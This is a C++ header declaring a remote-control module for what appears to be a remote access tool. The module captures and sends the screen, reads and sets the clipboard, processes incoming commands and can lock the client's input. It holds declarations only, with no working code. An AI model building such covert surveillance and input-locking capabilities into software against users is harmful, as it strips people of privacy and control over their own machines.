#pragma once
#include "Manager.h"
#include"ScreenSpy.h"
class CRemoteControl :
	public CManager
{
public:
	CRemoteControl(_CIOCPClient* IOCPClient);
	~CRemoteControl();
	virtual  void  HandleIO(PBYTE  BufferData, ULONG_PTR  BufferLength);
	static  DWORD  WINAPI  SendProcedure(LPVOID  ParameterData);
	VOID  SendBitmapInfo();
	VOID  SendFirstScreenData();
	VOID  SendNextScreenData();
	VOID  AnalyzeCommand(LPBYTE  BufferData, ULONG BufferLength);
	VOID  SendClipboard();
	VOID  SetClipboard(char* BufferData, ULONG  BufferLength);
public:
	BOOL    m_IsLoop;
	HANDLE  m_ThreadHandle;
	CScreenSpy*  m_ScreenSpyObject;
	BOOL    m_IsBlockInput;         //是否锁定客户端操作
};

